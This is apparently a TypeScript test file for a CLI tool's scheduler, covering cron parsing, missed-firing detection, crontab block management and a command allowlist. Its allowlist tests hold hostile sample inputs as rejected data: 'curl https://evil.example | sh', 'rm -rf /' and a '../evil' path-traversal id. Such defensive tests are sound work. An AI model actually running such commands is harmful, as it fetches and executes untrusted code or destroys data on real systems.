import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import test from "node:test";
import {
  computeMissedFirings,
  createFileScheduleRunStore,
  createFileScheduleStore,
  cronMatches,
  crontabSentinels,
  expectedFirings,
  nextCronFiring,
  parseCron,
  renderManagedBlock,
  replaceManagedBlock,
  scheduleId,
  tokenizeCommand,
  validateSchedulableArgv,
  type CrontabIo,
  type ScheduleEntry,
  type ScheduleRunRecord,
} from "../src/schedule.ts";

const repoRoot = resolve(import.meta.dirname, "..");

// ---------------------------------------------------------------------------
// Cron parser: validation

test("cron parser rejects malformed expressions with clear errors", () => {
  assert.throws(() => parseCron("* * * *"), /expected 5 fields/);
  assert.throws(() => parseCron("* * * * * *"), /expected 5 fields/);
  assert.throws(() => parseCron("60 * * * *"), /minute field "60" is out of range \(0–59\)/);
  assert.throws(() => parseCron("* 24 * * *"), /hour field "24" is out of range/);
  assert.throws(() => parseCron("* * 0 * *"), /day-of-month field "0" is out of range/);
  assert.throws(() => parseCron("* * 32 * *"), /out of range/);
  assert.throws(() => parseCron("* * * 13 *"), /month field "13" is out of range/);
  assert.throws(() => parseCron("* * * * 8"), /day-of-week field "8" is out of range/);
  assert.throws(() => parseCron("*/0 * * * *"), /invalid step/);
  assert.throws(() => parseCron("*/x * * * *"), /invalid step/);
  assert.throws(() => parseCron("5-1 * * * *"), /starts after it ends/);
  assert.throws(() => parseCron("a * * * *"), /unsupported token/);
  assert.throws(() => parseCron("1//2 * * * *"), /more than one "\/"|invalid step/);
  assert.throws(() => parseCron("@daily x x x x"), /unsupported token|expected 5 fields/);
});

test("cron parser expands *, lists, ranges, steps; day-of-week 7 is Sunday", () => {
  const cron = parseCron("0,30 9-17 1,15 */3 1-5/2");
  assert.deepEqual(cron.minute, [0, 30]);
  assert.deepEqual(cron.hour, [9, 10, 11, 12, 13, 14, 15, 16, 17]);
  assert.deepEqual(cron.dayOfMonth, [1, 15]);
  assert.deepEqual(cron.month, [1, 4, 7, 10]);
  assert.deepEqual(cron.dayOfWeek, [1, 3, 5]);

  assert.deepEqual(parseCron("* * * * 7").dayOfWeek, [0]);
  // Vixie "N/step": N through the field max.
  assert.deepEqual(parseCron("* 20/2 * * *").hour, [20, 22]);
  assert.equal(parseCron("* * * * *").minute.length, 60);
});

// ---------------------------------------------------------------------------
// Cron: next firing (local-time semantics; dates constructed locally)

test("nextCronFiring handles steps, ranges, lists, and weekly schedules", () => {
  // 2026-06-10 is a Wednesday; 2026-06-15 is a Monday.
  const at = (d: number, h: number, m: number) => new Date(2026, 5, d, h, m);

  assert.deepEqual(nextCronFiring(parseCron("*/15 * * * *"), at(10, 10, 7)), at(10, 10, 15));
  assert.deepEqual(nextCronFiring(parseCron("0 9-17 * * *"), at(10, 18, 0)), at(11, 9, 0));
  assert.deepEqual(nextCronFiring(parseCron("0,30 8 * * *"), at(10, 8, 10)), at(10, 8, 30));
  assert.deepEqual(nextCronFiring(parseCron("0 6 * * 1"), at(10, 12, 0)), at(15, 6, 0));
  // Strictly after: a firing minute does not return itself.
  assert.deepEqual(nextCronFiring(parseCron("0 6 * * 1"), at(15, 6, 0)), new Date(2026, 5, 22, 6, 0));
  // Day-of-month only.
  assert.deepEqual(nextCronFiring(parseCron("0 0 13 * *"), at(14, 0, 0)), new Date(2026, 6, 13, 0, 0));
});

test("nextCronFiring uses vixie OR semantics when both day fields are restricted", () => {
  // "13th of the month OR Friday": 2026-06-12 is a Friday, 2026-06-13 a Saturday.
  const cron = parseCron("0 0 13 * 5");
  assert.deepEqual(nextCronFiring(cron, new Date(2026, 5, 10, 12, 0)), new Date(2026, 5, 12, 0, 0));
  assert.deepEqual(nextCronFiring(cron, new Date(2026, 5, 12, 0, 0)), new Date(2026, 5, 13, 0, 0));
  assert.ok(cronMatches(cron, new Date(2026, 5, 13, 0, 0)), "the 13th matches via day-of-month");
  assert.ok(cronMatches(cron, new Date(2026, 5, 19, 0, 0)), "a Friday matches via day-of-week");
  assert.ok(!cronMatches(cron, new Date(2026, 5, 14, 0, 0)), "a plain Sunday matches neither");
});

test("nextCronFiring rejects expressions that never fire", () => {
  assert.throws(() => nextCronFiring(parseCron("0 0 31 2 *"), new Date(2026, 0, 1)), /never fires/);
});

test("expectedFirings enumerates firings inside an exclusive window, capped", () => {
  const cron = parseCron("0 * * * *");
  const firings = expectedFirings(cron, new Date(2026, 5, 10, 9, 0), new Date(2026, 5, 10, 12, 30));
  assert.deepEqual(
    firings,
    [new Date(2026, 5, 10, 10, 0), new Date(2026, 5, 10, 11, 0), new Date(2026, 5, 10, 12, 0)],
  );
  const capped = expectedFirings(parseCron("* * * * *"), new Date(2026, 5, 9), new Date(2026, 5, 10), 10);
  assert.equal(capped.length, 10);
});

// ---------------------------------------------------------------------------
// Missed-firing detection (visibility only)

function entryWith(overrides: Partial<ScheduleEntry> = {}): ScheduleEntry {
  return {
    id: "sch_test0001",
    label: "test",
    argv: ["audit", "--demo"],
    cron: "0 * * * *",
    provider: "local",
    enabled: true,
    createdAt: new Date(2026, 5, 10, 9, 0).toISOString(),
    ...overrides,
  };
}

function runAt(date: Date, overrides: Partial<ScheduleRunRecord> = {}): ScheduleRunRecord {
  return {
    scheduleId: "sch_test0001",
    firedAt: date.toISOString(),
    completedAt: date.toISOString(),
    trigger: "cron",
    exitCode: 0,
    outputTail: "",
    artifacts: { planIds: [], runLabels: [] },
    ...overrides,
  };
}

test("computeMissedFirings counts expected firings since the last run record", () => {
  const now = new Date(2026, 5, 10, 12, 30);
  // Never fired: every expected firing since creation is missed.
  const fresh = computeMissedFirings(entryWith(), [], now);
  assert.deepEqual(
    fresh.missed,
    [new Date(2026, 5, 10, 10, 0), new Date(2026, 5, 10, 11, 0), new Date(2026, 5, 10, 12, 0)],
  );
  assert.equal(fresh.capped, false);

  // A run at 11:00 moves the baseline; only 12:00 is missed.
  const afterRun = computeMissedFirings(entryWith(), [runAt(new Date(2026, 5, 10, 11, 0, 5))], now);
  assert.deepEqual(afterRun.missed, [new Date(2026, 5, 10, 12, 0)]);

  // No expected firings yet: nothing missed.
  const current = computeMissedFirings(entryWith(), [runAt(new Date(2026, 5, 10, 12, 0, 2))], now);
  assert.deepEqual(current.missed, []);

  // Every-minute schedule created a day ago hits the cap.
  const flood = computeMissedFirings(
    entryWith({ cron: "* * * * *", createdAt: new Date(2026, 5, 9, 12, 30).toISOString() }),
    [],
    now,
  );
  assert.equal(flood.missed.length, 100);
  assert.equal(flood.capped, true);
});

// ---------------------------------------------------------------------------
// Governance: the schedulable allowlist

test("allowlist accepts read/plan-side commands and apply --plan-id only", () => {
  for (const argv of [
    ["audit", "--demo", "--save"],
    ["snapshot", "--provider", "hubspot", "--out", "snap.json"],
    ["enrich", "append", "--source", "apollo", "--save"],
    ["enrich", "refresh", "--stale-days", "30"],
    ["market", "capture"],
    ["market", "refresh", "--run", "weekly"],
    ["suggest", "--plan-id", "patch_plan_x"],
    ["report", "--demo", "--out", "report.html"],
    ["doctor", "--json"],
    ["apply", "--plan-id", "patch_plan_x", "--provider", "hubspot"],
  ]) {
    assert.doesNotThrow(() => validateSchedulableArgv(argv), argv.join(" "));
  }
});

test("allowlist rejects writes, credentials, bare apply, and arbitrary strings", () => {
  assert.throws(() => validateSchedulableArgv([]), /empty/);
  assert.throws(() => validateSchedulableArgv(["login", "hubspot"]), /not schedulable/);
  assert.throws(() => validateSchedulableArgv(["logout", "hubspot"]), /not schedulable/);
  assert.throws(() => validateSchedulableArgv(["bulk-update", "account"]), /not schedulable/);
  assert.throws(() => validateSchedulableArgv(["fix", "--rule", "x", "--yes"]), /not schedulable/);
  assert.throws(() => validateSchedulableArgv(["rm", "-rf", "/"]), /not schedulable/);
  assert.throws(() => validateSchedulableArgv(["toString"]), /not schedulable/);
  // Sub-command restrictions: only the read/plan-side verbs of each namespace.
  assert.throws(() => validateSchedulableArgv(["enrich", "ingest", "x.csv"]), /only: enrich append, enrich refresh/);
  assert.throws(() => validateSchedulableArgv(["market", "classify"]), /only: market capture, market refresh/);
  assert.throws(() => validateSchedulableArgv(["market"]), /only: market capture, market refresh/);
  // apply: --plan-id or nothing; no flag relaxes the approved-plan gate.
  assert.throws(() => validateSchedulableArgv(["apply"]), /ONLY as `apply --plan-id <id>/);
  assert.throws(() => validateSchedulableArgv(["apply", "--provider", "hubspot"]), /ONLY as/);
  assert.throws(() => validateSchedulableArgv(["apply", "--plan-id"]), /ONLY as/);
  assert.throws(
    () => validateSchedulableArgv(["apply", "--plan", "plan.json", "--approve", "all"]),
    /ONLY as|bypass/,
  );
  assert.throws(
    () => validateSchedulableArgv(["apply", "--plan-id", "p1", "--approve", "all"]),
    /bypass/,
  );
  assert.throws(() => validateSchedulableArgv(["audit", "--profile", "acme"]), /profile-scoped/);
});

test("tokenizeCommand splits on whitespace and honors quotes", () => {
  assert.deepEqual(tokenizeCommand("audit --demo --save"), ["audit", "--demo", "--save"]);
  assert.deepEqual(tokenizeCommand('report --client "Acme Corp" --demo'), ["report", "--client", "Acme Corp", "--demo"]);
  assert.deepEqual(tokenizeCommand("report --title 'Q3 GTM Health'"), ["report", "--title", "Q3 GTM Health"]);
  assert.deepEqual(tokenizeCommand("  audit   --demo  "), ["audit", "--demo"]);
  assert.throws(() => tokenizeCommand('audit --client "Acme'), /Unclosed/);
});

// ---------------------------------------------------------------------------
// Stores: round-trip

test("schedule store round-trips add/list/get/enable/remove", async () => {
  const dir = mkdtempSync(join(tmpdir(), "fsgtm-schedule-store-"));
  try {
    const store = createFileScheduleStore(dir);
    const entry = entryWith({ id: scheduleId("test", "0 * * * *", ["audit", "--demo"], "2026-06-10") });
    await store.add(entry);
    assert.deepEqual(await store.list(), [entry]);
    assert.deepEqual(await store.get(entry.id), entry);
    assert.equal(await store.get("sch_missing"), null);

    await assert.rejects(store.add(entry), /already exists/);

    const disabled = await store.setEnabled(entry.id, false);
    assert.equal(disabled.enabled, false);
    assert.equal((await store.get(entry.id))!.enabled, false);
    await assert.rejects(store.setEnabled("sch_missing", true), /No schedule/);

    assert.equal(await store.remove(entry.id), true);
    assert.equal(await store.remove(entry.id), false);
    assert.deepEqual(await store.list(), []);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("schedule run store appends records per schedule and lists newest-last", async () => {
  const dir = mkdtempSync(join(tmpdir(), "fsgtm-schedule-runs-"));
  try {
    const store = createFileScheduleRunStore(dir);
    const first = runAt(new Date(2026, 5, 10, 10, 0), { exitCode: 0 });
    const second = runAt(new Date(2026, 5, 10, 11, 0), { exitCode: 2, trigger: "manual" });
    await store.record(first);
    await store.record(second);
    const runs = await store.list("sch_test0001");
    assert.equal(runs.length, 2);
    assert.equal(runs[0].exitCode, 0);
    assert.equal(runs[1].exitCode, 2);
    assert.equal(runs[1].trigger, "manual");
    assert.deepEqual(await store.list("sch_test0001", 1), [second]);
    assert.deepEqual(await store.list("sch_other"), []);
    await assert.rejects(store.record(runAt(new Date(), { scheduleId: "../evil" })), /Invalid schedule id/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Local provider: managed crontab block, via fakes only (NEVER the real crontab)

function fakeCrontab(initial: string): CrontabIo & { content: string } {
  const io = {
    content: initial,
    read: () => io.content,
    write: (next: string) => {
      io.content = next;
    },
  };
  return io;
}

test("install renders a sentinel block, replaces it wholesale, and preserves unmanaged lines", () => {
  const unmanaged = "MAILTO=ops@example.com\n0 1 * * * /usr/local/bin/backup.sh\n";
  const io = fakeCrontab(unmanaged);
  const entry = entryWith({ id: "sch_aaaa1111", cron: "0 6 * * 1", label: "weekly-audit" });
  const invocation = "'/usr/local/bin/node' '/repo/bin.js'";

  io.write(replaceManagedBlock(io.read(), "default", renderManagedBlock("default", [entry], invocation)));
  const installed = io.content;
  assert.ok(installed.includes("MAILTO=ops@example.com"), "unmanaged env line preserved");
  assert.ok(installed.includes("0 1 * * * /usr/local/bin/backup.sh"), "unmanaged job preserved");
  assert.ok(installed.includes(crontabSentinels("default").open));
  assert.ok(installed.includes(crontabSentinels("default").close));
  assert.ok(
    installed.includes("0 6 * * 1 '/usr/local/bin/node' '/repo/bin.js' schedule run sch_aaaa1111 --profile default --trigger cron"),
    "the crontab line is only `schedule run <id>` dispatch",
  );

  // Idempotent: re-install yields byte-identical content.
  io.write(replaceManagedBlock(io.read(), "default", renderManagedBlock("default", [entry], invocation)));
  assert.equal(io.content, installed);

  // A changed entry set replaces the block wholesale — exactly one block.
  const second = entryWith({ id: "sch_bbbb2222", cron: "30 7 * * *", label: "daily" });
  io.write(replaceManagedBlock(io.read(), "default", renderManagedBlock("default", [entry, second], invocation)));
  assert.equal(io.content.split(crontabSentinels("default").open).length, 2, "one opening sentinel");
  assert.ok(io.content.includes("sch_bbbb2222"));
  assert.ok(io.content.includes("0 1 * * * /usr/local/bin/backup.sh"));

  // Uninstall removes only the block.
  io.write(replaceManagedBlock(io.read(), "default", null));
  assert.equal(io.content, unmanaged);
});

test("managed blocks are per profile and damaged sentinels are refused", () => {
  const entry = entryWith({ id: "sch_cccc3333" });
  const withAcme = replaceManagedBlock("", "acme", renderManagedBlock("acme", [entry], "node bin.js"));
  const withBoth = replaceManagedBlock(withAcme, "globex", renderManagedBlock("globex", [entry], "node bin.js"));
  assert.ok(withBoth.includes("# >>> fullstackgtm acme >>>"));
  assert.ok(withBoth.includes("# >>> fullstackgtm globex >>>"));

  // Removing one profile's block leaves the other intact.
  const acmeOnly = replaceManagedBlock(withBoth, "globex", null);
  assert.ok(acmeOnly.includes("# >>> fullstackgtm acme >>>"));
  assert.ok(!acmeOnly.includes("globex"));

  assert.throws(
    () => replaceManagedBlock("# >>> fullstackgtm acme >>>\nstray\n", "acme", null),
    /damaged fullstackgtm block/,
  );
  // Uninstall with no block present is a no-op.
  assert.equal(replaceManagedBlock("0 1 * * * job\n", "acme", null), "0 1 * * * job\n");
  assert.equal(replaceManagedBlock("", "acme", null), "");
});

// ---------------------------------------------------------------------------
// CLI integration (spawned with a temp FSGTM_HOME; PATH is emptied so any
// accidental `crontab` spawn fails loudly)

function runCli(args: string[], home: string) {
  const emptyPath = mkdtempSync(join(tmpdir(), "fsgtm-empty-path-"));
  try {
    const env: NodeJS.ProcessEnv = {
      ...process.env,
      FSGTM_HOME: home,
      PATH: emptyPath,
      NODE_OPTIONS: "",
    };
    delete env.HUBSPOT_ACCESS_TOKEN;
    delete env.FULLSTACKGTM_PROFILE;
    return spawnSync(
      process.execPath,
      ["--experimental-strip-types", "src/bin.ts", ...args],
      { cwd: repoRoot, encoding: "utf8", env },
    );
  } finally {
    rmSync(emptyPath, { recursive: true, force: true });
  }
}

function withHome<T>(run: (home: string) => T): T {
  const home = mkdtempSync(join(tmpdir(), "fsgtm-schedule-home-"));
  try {
    return run(home);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
}

function addedScheduleId(home: string): string {
  const file = JSON.parse(readFileSync(join(home, "schedules.json"), "utf8")) as {
    schedules: Array<{ id: string }>;
  };
  return file.schedules[file.schedules.length - 1].id;
}

function runRecords(home: string, id: string): ScheduleRunRecord[] {
  const dir = join(home, "schedule", "runs", id);
  return readdirSync(dir)
    .sort()
    .map((name) => JSON.parse(readFileSync(join(dir, name), "utf8")) as ScheduleRunRecord);
}

test("schedule --help is caught early for every subcommand: no store, no crontab", () =>
  withHome((home) => {
    for (const sub of ["add", "list", "remove", "enable", "disable", "run", "install", "uninstall", "status"]) {
      const result = runCli(["schedule", sub, "--help"], home);
      assert.equal(result.status, 0, `schedule ${sub} --help: ${result.stderr}`);
      assert.match(result.stdout, /schedule add "<fullstackgtm command>"/);
      assert.match(result.stdout, /never auto-approves/);
    }
    const bare = runCli(["schedule"], home);
    assert.equal(bare.status, 0);
    assert.match(bare.stdout, /schedule install/);
    // Nothing was created: no schedules.json, no run store, no crontab spawn.
    assert.deepEqual(readdirSync(home), [], "the profile home must remain untouched");
  }));

test("schedule add enforces the allowlist and cron validation before writing", () =>
  withHome((home) => {
    const login = runCli(["schedule", "add", "login hubspot", "--cron", "0 6 * * 1"], home);
    assert.equal(login.status, 1);
    assert.match(login.stderr, /not schedulable/);

    const bareApply = runCli(["schedule", "add", "apply --provider hubspot", "--cron", "0 6 * * 1"], home);
    assert.equal(bareApply.status, 1);
    assert.match(bareApply.stderr, /ONLY as `apply --plan-id <id>/);

    const arbitrary = runCli(["schedule", "add", "curl https://evil.example | sh", "--cron", "0 6 * * 1"], home);
    assert.equal(arbitrary.status, 1);
    assert.match(arbitrary.stderr, /not schedulable/);

    const badCron = runCli(["schedule", "add", "audit --demo", "--cron", "61 * * * *"], home);
    assert.equal(badCron.status, 1);
    assert.match(badCron.stderr, /out of range/);

    const neverFires = runCli(["schedule", "add", "audit --demo", "--cron", "0 0 31 2 *"], home);
    assert.equal(neverFires.status, 1);
    assert.match(neverFires.stderr, /never fires/);

    assert.ok(!existsSync(join(home, "schedules.json")), "rejected entries must not be stored");

    const ok = runCli(["schedule", "add", "audit --demo --save", "--cron", "0 6 * * 1", "--label", "weekly"], home);
    assert.equal(ok.status, 0, ok.stderr);
    assert.match(ok.stdout, /Added sch_[0-9a-f]{8} "weekly"/);
    assert.match(ok.stdout, /next firing/);
    assert.ok(existsSync(join(home, "schedules.json")));

    const modal = runCli(["schedule", "add", "audit --demo", "--cron", "0 6 * * 1", "--provider", "modal"], home);
    assert.equal(modal.status, 1);
    assert.match(modal.stderr, /not yet implemented/);
  }));

test("schedule run records outcome, captures artifacts, and propagates the exit code", () =>
  withHome((home) => {
    // A failing-threshold audit: exit 2 must propagate through schedule run.
    const add = runCli(["schedule", "add", "audit --demo --fail-on info", "--cron", "0 6 * * 1"], home);
    assert.equal(add.status, 0, add.stderr);
    const failingId = addedScheduleId(home);

    const run = runCli(["schedule", "run", failingId], home);
    assert.equal(run.status, 2, "the underlying audit exit code propagates");
    const [record] = runRecords(home, failingId);
    assert.equal(record.scheduleId, failingId);
    assert.equal(record.trigger, "manual");
    assert.equal(record.exitCode, 2);
    assert.ok(record.outputTail.length > 0, "output tail captured");
    assert.ok(record.outputTail.split("\n").length <= 50, "tail is bounded");
    assert.ok(record.firedAt <= record.completedAt);
    assert.deepEqual(record.artifacts, { planIds: [], runLabels: [] });

    // A plan-producing run: the new plan id lands in artifacts.
    const addSave = runCli(["schedule", "add", "audit --demo --save", "--cron", "30 6 * * 1"], home);
    assert.equal(addSave.status, 0, addSave.stderr);
    const savingId = addedScheduleId(home);
    const saveRun = runCli(["schedule", "run", savingId, "--trigger", "cron"], home);
    assert.equal(saveRun.status, 0, saveRun.stderr);
    const [saveRecord] = runRecords(home, savingId);
    assert.equal(saveRecord.trigger, "cron", "provider invocations record trigger: cron");
    assert.equal(saveRecord.exitCode, 0);
    assert.equal(saveRecord.artifacts.planIds.length, 1);
    assert.match(saveRecord.artifacts.planIds[0], /^patch_plan_/);

    // Unknown id and disabled entries refuse to run.
    const missing = runCli(["schedule", "run", "sch_00000000"], home);
    assert.equal(missing.status, 1);
    assert.match(missing.stderr, /No schedule with id/);
    const disable = runCli(["schedule", "disable", savingId], home);
    assert.equal(disable.status, 0);
    const disabledRun = runCli(["schedule", "run", savingId], home);
    assert.equal(disabledRun.status, 1);
    assert.match(disabledRun.stderr, /disabled/);
  }));

test("scheduled apply hard-checks plan approval at run time: plan_not_approved no-op", () =>
  withHome((home) => {
    // Produce a real needs_approval plan in this profile's store.
    const seed = runCli(["schedule", "add", "audit --demo --save", "--cron", "0 6 * * 1"], home);
    assert.equal(seed.status, 0, seed.stderr);
    const seedId = addedScheduleId(home);
    assert.equal(runCli(["schedule", "run", seedId], home).status, 0);
    const planId = runRecords(home, seedId)[0].artifacts.planIds[0];
    assert.match(planId, /^patch_plan_/);

    // Scheduling the apply is allowed — executing it against an unapproved plan is not.
    const addApply = runCli(
      ["schedule", "add", `apply --plan-id ${planId} --provider hubspot`, "--cron", "0 7 * * 1"],
      home,
    );
    assert.equal(addApply.status, 0, addApply.stderr);
    const applyId = addedScheduleId(home);

    const gated = runCli(["schedule", "run", applyId], home);
    assert.equal(gated.status, 0, "a held governance gate is not a machinery failure");
    assert.match(gated.stderr, /never auto-approves/);
    const [record] = runRecords(home, applyId);
    assert.equal(record.noopReason, "plan_not_approved");
    assert.equal(record.exitCode, 0);
    assert.match(record.outputTail, /not approved/);

    // The plan was not touched: still needs_approval, no runs recorded on it.
    const stored = JSON.parse(readFileSync(join(home, "plans", `${planId}.json`), "utf8")) as {
      status: string;
      runs: unknown[];
    };
    assert.equal(stored.status, "needs_approval");
    assert.equal(stored.runs.length, 0);

    // A missing plan is also a no-op, never an execution.
    const addGhost = runCli(
      ["schedule", "add", "apply --plan-id patch_plan_ghost --provider hubspot", "--cron", "0 8 * * 1"],
      home,
    );
    assert.equal(addGhost.status, 0, addGhost.stderr);
    const ghostId = addedScheduleId(home);
    assert.equal(runCli(["schedule", "run", ghostId], home).status, 0);
    assert.equal(runRecords(home, ghostId)[0].noopReason, "plan_not_approved");
  }));

test("a hand-edited entry that escapes the allowlist is re-caught at run time", () =>
  withHome((home) => {
    // Forge a schedules.json directly (the file is user-editable).
    mkdirSync(home, { recursive: true });
    const entry = entryWith({ id: "sch_forged01", argv: ["login", "hubspot"] });
    writeFileSync(join(home, "schedules.json"), JSON.stringify({ version: 1, schedules: [entry] }));

    const result = runCli(["schedule", "run", "sch_forged01"], home);
    assert.equal(result.status, 1);
    assert.match(result.stderr, /not schedulable/);
    const [record] = runRecords(home, "sch_forged01");
    assert.equal(record.noopReason, "not_schedulable");
    assert.equal(record.exitCode, 1);
  }));

test("schedule list and status report entries, runs, and missed firings", () =>
  withHome((home) => {
    const add = runCli(["schedule", "add", "doctor --json", "--cron", "*/5 * * * *", "--label", "heartbeat"], home);
    assert.equal(add.status, 0, add.stderr);
    const id = addedScheduleId(home);

    const list = runCli(["schedule", "list", "--json"], home);
    assert.equal(list.status, 0);
    const entries = JSON.parse(list.stdout) as Array<{ id: string; nextFiring: string | null; enabled: boolean }>;
    assert.equal(entries.length, 1);
    assert.equal(entries[0].id, id);
    assert.ok(entries[0].nextFiring, "next firing computed from the cron expression");

    assert.equal(runCli(["schedule", "run", id], home).status, 0);

    // Backdate the run record so missed firings accumulate.
    const dir = join(home, "schedule", "runs", id);
    const [fileName] = readdirSync(dir);
    const record = JSON.parse(readFileSync(join(dir, fileName), "utf8")) as ScheduleRunRecord;
    const backdated = new Date(Date.now() - 31 * 60 * 1000); // 31 minutes ago ≈ 6 expected */5 firings
    record.firedAt = backdated.toISOString();
    writeFileSync(join(dir, fileName), JSON.stringify(record));

    const status = runCli(["schedule", "status", id, "--runs", "5", "--json"], home);
    assert.equal(status.status, 0, status.stderr);
    const [report] = JSON.parse(status.stdout) as Array<{
      lastRun: { exitCode: number; trigger: string };
      missedFirings: string[];
      runs: ScheduleRunRecord[];
      streak: { outcome: string };
    }>;
    assert.equal(report.lastRun.exitCode, 0);
    assert.equal(report.lastRun.trigger, "manual");
    assert.equal(report.streak.outcome, "success");
    assert.ok(report.missedFirings.length >= 5, `expected >=5 missed firings, got ${report.missedFirings.length}`);
    assert.equal(report.runs.length, 1);

    const removed = runCli(["schedule", "remove", id], home);
    assert.equal(removed.status, 0);
    const empty = runCli(["schedule", "status"], home);
    assert.equal(empty.status, 0);
    assert.match(empty.stdout, /No schedules/);
  }));
